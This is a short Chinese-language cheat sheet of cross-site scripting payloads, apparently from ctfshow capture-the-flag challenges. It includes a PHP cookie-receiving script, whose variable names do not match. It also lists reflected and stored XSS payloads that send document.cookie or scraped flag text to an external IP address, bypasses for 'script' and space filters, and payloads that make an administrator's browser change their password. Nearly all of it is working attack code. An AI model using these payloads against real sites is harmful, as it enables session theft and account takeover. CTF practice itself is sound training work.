反射型：

```php
$conten=$_GET[1];
if(isset($content)){
    file_put_contents('tmp/flag.txt',$content);
}else{
    echo 'no data input';
}
```

```javascript
<script>document.location.href='http://49.232.215.127/1.php?1='+document.cookie</script>
// 过滤了script
<body onload="window.location.href='http://49.232.215.127/1.php?1='+document.cookie"></body>
// 过滤空格
<body/**/onload="window.location.href='http://49.232.215.127/1.php?1='+document.cookie"></body>

```

存储型

```javascript
<body/**/onload="window.location.href='http://49.232.215.127/1.php?1='+document.cookie"></body>

<script>window.location.href='http://49.232.215.127/1.php?1='+document.cookie</script>

cookie迅速失效则可以直接读数据
<script>$('.laytable-cell-1-0-1').each(function(index,value){if(value.innerHTML.indexOf('ctf'+'show{')>-1){window.location.href='http://49.232.215.127/1.php?1='+value.innerHTML;}});</script>

// 通过xss钓鱼让管理员修改自己的密码
<script>window.location.href='http://127.0.0.1/api/change.php?p=123'</script>

post方法提交
<script>$.ajax({url:'api/change.php',type:'post',data:{p:'123'}});</script>

```
